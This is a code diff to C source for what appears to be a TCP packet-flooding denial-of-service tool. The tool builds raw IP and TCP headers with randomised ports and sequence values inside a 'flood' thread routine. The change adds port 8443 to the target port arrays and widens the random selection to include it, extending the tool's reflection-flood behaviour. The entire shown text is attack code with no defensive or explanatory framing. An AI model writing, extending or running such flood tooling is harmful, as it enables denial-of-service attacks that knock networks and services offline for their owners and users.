@@ -187,13 +187,13 @@ void setup_ip_header(struct iphdr *iph)
 	iph->saddr = inet_addr("0.0.0.0");
 }
 
-int sPorts[4] = {80, 443, 8080, 7547};
-int dPorts[5] = {80, 443, 8080, 7547}; /* Len = 4 plus floodport */
+int sPorts[5] = {80, 443, 8080, 7547, 8443};
+int dPorts[6] = {80, 443, 8080, 7547, 8443}; /* Len = 4 plus floodport */
 int windows[4] = {8192, 65535, 14600, 64240};
 
 void setup_tcp_header(struct tcphdr *tcph)
 {
-	tcph->dest = htons(sPorts[randnum(0, 3)]);
+	tcph->dest = htons(sPorts[randnum(0, 4)]);
 	tcph->source = htons(floodport);
 	tcph->ack = 0;
 	tcph->ack_seq = randnum(10000, 99999);
@@ -336,18 +336,18 @@ void *flood(void *par1)
 		}
 		else
 		{
-			int drdossType = sPorts[randnum(0, 3)];
+			int drdossType = sPorts[randnum(0, 4)];
 
 			if (floodport == 0)
 			{
 				if (randnum(0, 1) == 1)
 				{
-					tcph->dest = htons(sPorts[randnum(0, 3)]);
+					tcph->dest = htons(sPorts[randnum(0, 4)]);
 					tcph->source = htons(randnum(1024, 65535));
 				}
 				else
 				{
-					tcph->dest = htons(sPorts[randnum(0, 3)]);
+					tcph->dest = htons(sPorts[randnum(0, 4)]);
 					tcph->source = htons(randnum(1, 65535));
 				}
 			}
@@ -355,13 +355,13 @@ void *flood(void *par1)
 			{
 				if (randnum(0, 1) == 1)
 				{
-					tcph->dest = htons(floodport);
+					tcph->dest = htons(sPorts[randnum(0, 4)]);
 					tcph->source = htons(drdossType);
 				}
 				else
 				{
 					tcph->source = htons(floodport);
-					tcph->dest = htons(sPorts[randnum(0, 3)]);
+					tcph->dest = htons(sPorts[randnum(0, 4)]);
 				}
 			}
 			opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
